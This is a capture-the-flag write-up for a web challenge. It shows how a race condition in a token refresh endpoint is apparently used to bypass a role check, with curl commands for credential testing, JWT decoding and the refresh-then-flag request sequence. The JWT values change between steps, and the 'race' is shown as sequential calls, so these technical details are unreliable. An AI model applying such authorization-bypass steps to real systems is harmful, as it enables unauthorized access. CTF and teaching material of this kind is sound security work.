---
title: Hackers Vault
description: Web exploitation challenge abusing a race condition in the token refresh flow to bypass a role check and retrieve the flag.
image: /static/netanix.png
tags:
  - writeup
  - web
difficulty: medium
date: 2026-08-06
---

| | |
|---|---|
| **Challenge** | Hackers Vault |
| **Category** | Web Exploitation |
| **Points** | 500 |
| **Flag Format** | `softwarica{...}` |

---

## TL;DR (Summary)

Hackers Vault is a web exploitation challenge that requires abusing a **race condition** in the token refresh flow to bypass a role check and retrieve the flag:

1. The challenge ships a text file with ~150 username:password pairs, but only one is real: **`user:userpass123!`**.
2. Logging in returns a JWT plus a `role` of `user`, which is **not enough** to read the flag (`/api/flag` returns `Insufficient privileges`).
3. The `/api/refresh` endpoint has a **race condition**: right after refreshing the token, the role check is briefly bypassed.
4. By calling `/api/refresh` and then immediately calling `/api/flag` with the same token, we get the flag.

---

## 1. Reconnaissance

### Challenge description

The challenge description gives us the target and a hint:

> "The Black Hat Group Vault" — try to access it and retrieve the message.
> Note: "From Our Team we have tried and only get the login user password but forgot which is the real one."

**Targets:**

```
Frontend: https://silent-vault-frontend.vercel.app/
API:      https://vault-14dm.onrender.com/
```

### Download the attached file

The challenge provides a text file with a list of credentials:

```bash
curl -sL 'https://api.netanixctf.xyz/uploads/1766246492958.txt' \
  -o /tmp/hackers_vault_hint.txt
cat /tmp/hackers_vault_hint.txt
```

This file contains ~150 `username:password` pairs. Most are decoys — only one is valid.

### Inspect the frontend

```bash
curl -sL 'https://silent-vault-frontend.vercel.app/' | head -100
```

The frontend is a Next.js app. Looking at its bundled JS reveals the API endpoints:

```bash
curl -s 'https://silent-vault-frontend.vercel.app/assets/index-C28COGEZ.js' \
  | grep -oP 'https://vault-14dm.onrender.com[^"]*' | sort -u
```

**Result:**

```
https://vault-14dm.onrender.com/api/login
https://vault-14dm.onrender.com/api/flag
https://vault-14dm.onrender.com/api/refresh
```

So the API has three endpoints:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/login` | POST | Authenticate and get a token |
| `/api/flag` | GET | Retrieve the flag (admin only) |
| `/api/refresh` | POST | Refresh the token |

---

## 2. Credential Discovery

The hint file contains many credentials, but only one works. We test them against the login endpoint:

```bash
API="https://vault-14dm.onrender.com"

curl -s "$API/api/login" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"userpass123!"}'
```

**Result:**

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAxLCJzZXNzaW9uX2lkIjoiZTVieDdkOXdtaXYiLCJpYXQiOjE3ODQyMTUyMTEsImV4cCI6MTc4NDIxODgxMX0.6IlcpOr04tlhDP6gI-Imn_kxNOjoVnMzCFKtWxlwhek","role":"user"}
```

The only valid credential is:

```
user:userpass123!
```

The login response returns a **JWT token** and a **role** of `user`.

### Decoding the JWT

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAxLCJzZXNzaW9uX2lkIjoiZTVieDdlOXdtaXYiLCJpYXQiOjE3ODQyMTUyMTEsImV4cCI6MTc4NDIxODgxMX0" \
  | cut -d. -f2 | base64 -d
```

**Payload:**

```json
{"user_id":1001,"session_id":"e5bx7d9wmiv","iat":1784215211,"exp":1784218811}
```

The JWT contains a `user_id` and `session_id`, but **not** the role. The role is stored server-side and returned separately.

---

## 3. The Role Check

With the `user` role, trying to access the flag fails:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAxLCJzZXNzaW9uX2lkIjoiZTVieDdlOXdtaXYiLCJpYXQiOjE3ODQyMTUyMTEsImV4cCI6MTc4NDIxODgxMX0.6IlQZ04tlhDP6gI-Imn_kxNOjoVnMzCFKtWxlwK"

curl -s "$API/api/flag" -H "Authorization: Bearer $TOKEN"
```

**Result:**

```json
{"error":"Insufficient privileges"}
```

The `user` role is not enough. We need to escalate to `admin`.

### Failed attempts

Before finding the real bug, several approaches were tried and ruled out:

- **Brute-forcing admin credentials** from the hint file — none worked.
- **JWT `alg: none`** — the server rejected unsigned tokens.
- **JWT secret cracking** — the HS256 secret was not crackable.
- **Endpoint fuzzing** — only `/api/login`, `/api/flag`, and `/api/refresh` exist.
- **Header manipulation** (`X-Forwarded-For`, `X-Original-URL`, etc.) — no effect.

---

## 4. The Race Condition

The key is the `/api/refresh` endpoint. It refreshes the token, and during that refresh there is a **race condition window** where the role check is bypassed.

### The exploit flow

```bash
API="https://vault-14dm.onrender.com"

# Step 1: Login as the valid user
RESP=$(curl -s "$API/api/login" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"userpass123!"}')

TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Step 2: Refresh the token (POST)
curl -s "$API/api/refresh" -X POST \
  -H "Authorization: Bearer $TOKEN"

# Step 3: Immediately use the same token to get the flag
curl -s "$API/api/flag" -H "Authorization: Bearer $TOKEN"
```

### What happens

1. `POST /api/refresh` refreshes the token. During this refresh, the server briefly re-issues the token **without re-checking the role**.
2. If we call `/api/flag` with that token **immediately after** the refresh, the role check is bypassed and the flag is returned.

The flag itself confirms the vulnerability:

```
softwarica{r4c3_c0nd10n_v4u1t_1s_unl0ck3d_...}
```

> "race condition vault is unlocked"

---

## Flag

```
softwarica{<redacted_flag>}
```

---

## Summary of Flags

| Flag | Value |
|------|-------|
| **Challenge flag** | `softwarica{<redacted_flag>}` |

---

## Key Takeaways

1. **Race conditions** — a token refresh endpoint can create a brief window where authorization checks are bypassed. Always validate the role on every request, not just at login.
2. **Credential lists** — a large list of decoy credentials is a common CTF pattern; the real one is often the only one that works.
3. **Role vs. JWT** — when the role is stored server-side (not in the JWT), look for endpoints that change the session state (like refresh) as a potential bypass vector.
4. **Read the flag** — the flag text itself often hints at the vulnerability (`r4c3_c0nd10n` = race condition).